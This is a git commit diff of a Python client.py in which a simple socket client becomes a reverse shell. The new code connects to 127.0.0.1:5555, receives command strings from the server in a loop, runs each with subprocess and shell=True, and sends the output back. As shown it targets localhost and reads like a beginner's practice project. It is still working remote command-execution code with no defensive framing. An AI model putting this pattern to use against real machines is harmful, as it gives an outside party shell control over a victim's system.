8c36fa615dd45e278cde82873ebd27ee618a2bfa
Elieroc <34548349+Elieroc@users.noreply.github.com>
2021-01-09 17:47:00 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,17 +1,24 @@
 import socket
+import subprocess
 
-host, port = ('127.0.0.1', 6666)
+host, port = ('127.0.0.1', 5555)
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try :
     socket.connect((host, port))
-    print("Client connecté")
+    print(" /!\ Client connecté /!\ \n")
 
-    data = "Yop"
-    data = data.encode("utf8")
-    socket.sendall(data)
+    while True:
+        command = socket.recv(9999)
+        command = command.decode("utf8")
+
+        print(command)
+
+        result = subprocess.check_output(command, shell=True)
+        print(result.decode("utf-8"))
+        socket.send(result)
 
 except:
-    print('Connexion au serveur échouée')
+    print(' /!\ Connexion au serveur échouée /!\ ')
 finally:
     socket.close()
